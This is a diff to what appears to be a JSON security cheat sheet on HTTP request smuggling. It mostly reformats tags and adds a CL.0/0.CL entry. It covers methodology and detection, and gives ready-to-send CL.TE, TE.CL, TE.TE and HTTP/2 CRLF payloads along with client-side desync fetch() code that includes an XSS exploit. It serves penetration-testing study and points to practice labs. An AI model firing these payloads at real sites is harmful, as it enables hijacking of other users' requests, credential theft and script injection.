@@ -6,36 +6,51 @@
       "subcategory": "Methodology",
       "title": "What is HTTP Request Smuggling",
       "language": "text",
-      "tags": ["methodology", "concept"],
+      "tags": [
+        "methodology",
+        "concept"
+      ],
       "body": "HTTP Request Smuggling occurs when a request is processed by several \"hops\" (frontend/proxy/CDN and backend), but they determine differently where the request starts and where it ends. This discrepancy lets you interfere with someone else's request/response or bypass access controls.\n\nThe cause is usually a different priority of HTTP headers (Content-Length versus Transfer-Encoding), different handling of \"malformed\" headers (for example, whether a header with an unexpected space is ignored), downgrading a request from a newer protocol (HTTP/2 -> HTTP/1.1), or a difference in when a partial request is considered \"stale\" and should be discarded."
     },
     {
       "subcategory": "Methodology",
       "title": "Where to look and how to test manually",
       "language": "text",
-      "tags": ["methodology", "how-to-test"],
+      "tags": [
+        "methodology",
+        "how-to-test"
+      ],
       "body": "• The target is two hops in the chain: a frontend (reverse proxy, load balancer, CDN) and a backend. Desync is possible when they diverge in how they interpret request boundaries.\n• Basic classes: CL.TE (the frontend reads Content-Length, the backend reads Transfer-Encoding), TE.CL (the other way around), TE.TE (both understand TE, but one is forced not to process it via obfuscation).\n• During manual exploitation of TE.CL you have to compute the chunk size of the second (malicious) request by hand - PortSwigger warns directly: \"Manually fixing the length fields in request smuggling attacks can be tricky\".\n• In Burp Repeater disable the automatic Content-Length recalculation (Repeater -> menu -> uncheck \"Update Content-Length\"), otherwise Burp will \"fix\" the payload itself.\n• Do not forget the trailing sequence \\r\\n\\r\\n after the final 0 in the chunked body."
     },
     {
       "subcategory": "Methodology",
       "title": "Timing-based detection",
       "language": "text",
-      "tags": ["methodology", "detection", "timing"],
+      "tags": [
+        "methodology",
+        "detection",
+        "timing"
+      ],
       "body": "A safe way to probe for a desync is by the response delay.\n\nCL.TE: the frontend forwards the body by Content-Length, the backend waits for the terminating chunk by Transfer-Encoding. If you declare chunked but do not send the terminator, the backend \"hangs\" waiting for the next chunk -> a noticeable response delay.\n\nTE.CL: the other way around - the frontend processes chunked, the backend reads a fixed length by Content-Length and waits for the missing body bytes -> a timeout/delay.\n\nA delay instead of an instant response = a strong indicator of a desync. Timing is safer than \"poisoning\" because it does not affect other people's requests."
     },
     {
       "subcategory": "Methodology",
       "title": "Tools",
       "language": "text",
-      "tags": ["tools"],
+      "tags": [
+        "tools"
+      ],
       "body": "• Burp Suite -> the \"HTTP Request Smuggler\" extension (PortSwigger, bappstore) - auto-detection and launching smuggling attacks.\n• defparam/Smuggler - an HTTP Request Smuggling / Desync tester in Python 3.\n• dhmosfunk/simple-http-smuggler-generator - a payload generator for HTTP Request Smuggling labs and the Burp Suite Practitioner exam."
     },
-
     {
       "subcategory": "CL.TE",
       "title": "CL.TE - basic payload",
       "language": "http",
-      "tags": ["cl.te", "desync", "exploitation"],
+      "tags": [
+        "cl.te",
+        "desync",
+        "exploitation"
+      ],
       "body": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
       "meta": {
         "tip": "The frontend uses Content-Length, the backend uses Transfer-Encoding. The frontend sees a body of 13 bytes (including 0\\r\\n\\r\\nSMUGGLED) and forwards it all. The backend, using chunked, ends the request at 0, and \"SMUGGLED\" stays in the buffer as the beginning of the next (someone else's) request."
@@ -45,15 +60,22 @@
       "subcategory": "CL.TE",
       "title": "CL.TE - working example (prefix G)",
       "language": "http",
-      "tags": ["cl.te", "desync", "exploitation"],
+      "tags": [
+        "cl.te",
+        "desync",
+        "exploitation"
+      ],
       "body": "POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG"
     },
-
     {
       "subcategory": "TE.CL",
       "title": "TE.CL - basic payload",
       "language": "http",
-      "tags": ["te.cl", "desync", "exploitation"],
+      "tags": [
+        "te.cl",
+        "desync",
+        "exploitation"
+      ],
       "body": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0",
       "meta": {
         "tip": "The frontend uses Transfer-Encoding, the backend uses Content-Length. The frontend, using chunked, reads a chunk of size 8 (\"SMUGGLED\") and the terminating 0. The backend, using Content-Length: 3, takes only the first 3 bytes of the body, and the remainder (starting with \"SMUGGLED\") settles as the beginning of the next request."
@@ -63,54 +85,74 @@
       "subcategory": "TE.CL",
       "title": "TE.CL - working example (GPOST)",
       "language": "http",
-      "tags": ["te.cl", "desync", "exploitation"],
+      "tags": [
+        "te.cl",
+        "desync",
+        "exploitation"
+      ],
       "body": "POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0\n\n",
       "meta": {
         "tip": "To send from Burp Repeater, in the Repeater menu uncheck \"Update Content-Length\". Be sure to keep the trailing sequence \\r\\n\\r\\n after the final 0. 5c is the hex size of the chunk (the nested request)."
       }
     },
-
     {
       "subcategory": "TE.TE",
       "title": "TE.TE - obfuscation of the Transfer-Encoding header",
       "language": "text",
-      "tags": ["te.te", "obfuscation", "header"],
+      "tags": [
+        "te.te",
+        "obfuscation",
+        "header"
+      ],
       "body": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
       "meta": {
         "tip": "Both servers support Transfer-Encoding, but one of them can be forced NOT to process it by obfuscating the header. Then TE.TE reduces to CL.TE or TE.CL. Try the variants one at a time. Here [tab], [space], [\\n] are literals of real control characters (tab, space, line feed)."
       }
     },
-
     {
       "subcategory": "HTTP/2 desync",
       "title": "HTTP/2 Request Smuggling - general idea",
       "language": "text",
-      "tags": ["http2", "desync", "downgrade"],
+      "tags": [
+        "http2",
+        "desync",
+        "downgrade"
+      ],
       "body": "HTTP/2 smuggling is possible when an intermediate node converts your HTTP/2 request into HTTP/1.1, and you can sneak into the translated request an invalid Content-Length, a Transfer-Encoding header, or line breaks (CRLF).\n\nSmuggling is also possible in a GET request: if you can hide an HTTP/1.1 request inside the value of an HTTP/2 header."
     },
     {
       "subcategory": "HTTP/2 desync",
       "title": "HTTP/2 -> HTTP/1.1 - CRLF injection into a header (H2.X)",
       "language": "http",
-      "tags": ["http2", "crlf", "desync"],
+      "tags": [
+        "http2",
+        "crlf",
+        "desync"
+      ],
       "body": ":method GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
       "meta": {
         "tip": "Into the value of an HTTP/2 header (header) literal \\r\\n\\r\\n and a second HTTP/1.1 request are written. After the downgrade to HTTP/1.1 these CRLFs break the request, and the hidden GET becomes a separate (smuggled) request."
       }
     },
-
     {
       "subcategory": "Client-Side Desync",
       "title": "Client-Side Desync - the essence of the technique",
       "language": "text",
-      "tags": ["client-side-desync", "browser", "concept"],
+      "tags": [
+        "client-side-desync",
+        "browser",
+        "concept"
+      ],
       "body": "On some paths the server does not expect POST requests and treats them as a regular GET, ignoring the body. Then one sent request may be read by the server as TWO.\n\nWhen the backend responds twice, the frontend believes that only the first response belongs to this request - the remaining responses \"shift\" and end up going to the next request/victim.\n\nThe trick of client-side desync is that the attack is launched by the victim's own browser (via JavaScript), not by the attacker's separate connection."
     },
     {
       "subcategory": "Client-Side Desync",
       "title": "Client-Side Desync - a POST treated as two requests",
       "language": "http",
-      "tags": ["client-side-desync", "desync"],
+      "tags": [
+        "client-side-desync",
+        "desync"
+      ],
       "body": "POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.example.com",
       "meta": {
         "tip": "If the path / does not expect POST and ignores the body, this request may be read as two: the outer POST and the GET hidden in the body. After that the responses desynchronize between the frontend and the backend."
@@ -120,7 +162,11 @@
       "subcategory": "Client-Side Desync",
       "title": "Triggering the desync from the victim's browser (fetch)",
       "language": "javascript",
-      "tags": ["client-side-desync", "browser", "exploitation"],
+      "tags": [
+        "client-side-desync",
+        "browser",
+        "exploitation"
+      ],
       "body": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
       "meta": {
         "tip": "JavaScript on the attacker's site forces the victim's browser to send a POST to the vulnerable site with the victim's cookie (credentials: 'include'). In the body there is a hidden GET. This way you can: save the victim's credentials to a place where the attacker can pick them up; force the victim to send an exploit to an internal site that is not reachable from outside; execute arbitrary JS as if on behalf of the site."
@@ -130,19 +176,37 @@
       "subcategory": "Client-Side Desync",
       "title": "Exploitation - XSS via client-side desync (redirect + CORS)",
       "language": "javascript",
-      "tags": ["client-side-desync", "xss", "exploitation"],
+      "tags": [
+        "client-side-desync",
+        "xss",
+        "exploitation"
+      ],
       "body": "fetch('https://www.example.com/redirect', {\n    method: 'POST',\n        body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,\n        credentials: 'include',\n        mode: 'cors' // throw an error instead of following redirect\n}).catch(() => {\n        location = 'https://www.example.com/'\n})",
       "meta": {
         "tip": "The victim's browser sends a POST to /redirect. The response is a redirect blocked by CORS, which triggers catch and the browser navigates to www.example.com. The site, however, mistakenly processes the HEAD request from the POST body (returns 404 with Content-Length), then the third request (GET /x?x=<script>...) and finally the browser's real GET. Because the browser sent only one request, it accepts the response to HEAD as the response to its GET, and treats the third and fourth responses as the body - and executes the attacker's script."
       }
     },
-
     {
       "subcategory": "Labs",
       "title": "PortSwigger - Request Smuggling labs",
       "language": "text",
-      "tags": ["labs", "practice"],
+      "tags": [
+        "labs",
+        "practice"
+      ],
       "body": "• HTTP request smuggling, basic CL.TE vulnerability - portswigger.net/web-security/request-smuggling/lab-basic-cl-te\n• HTTP request smuggling, basic TE.CL vulnerability - portswigger.net/web-security/request-smuggling/lab-basic-te-cl\n• HTTP request smuggling, obfuscating the TE header - portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header\n• Response queue poisoning via H2.TE request smuggling - portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling\n• Client-side desync - portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync"
+    },
+    {
+      "subcategory": "CL.0 / 0.CL desync (2025)",
+      "title": "CL.0 / 0.CL — server-side desync without Transfer-Encoding",
+      "language": "text",
+      "tags": [
+        "request-smuggling",
+        "desync",
+        "cl.0",
+        "http1.1"
+      ],
+      "body": "A 2024-2025 desync class (PortSwigger \"HTTP/1.1 Must Die\", J. Kettle) that needs NO Transfer-Encoding — it works where classic TE.CL/CL.TE are already fixed.\nCL.0: the backend IGNORES Content-Length on some endpoints (static, redirects, errors) and treats the body as the start of the NEXT request -> the body \"leaks\" as a separate request against the victim. Hunt for endpoints that respond WITHOUT reading the body: static GETs, 301/302, 405, 501.\n0.CL: the mirror image — the front ignores CL, the backend reads it.\nTooling: Burp HTTP Request Smuggler (CL.0 probes), Turbo Intruder. Confirm: \"poison\" a neighbouring request with a visible marker. Fix: HTTP/2 end-to-end, reject ambiguous messages, do not proxy to an HTTP/1.1 backend."
     }
   ]
 }
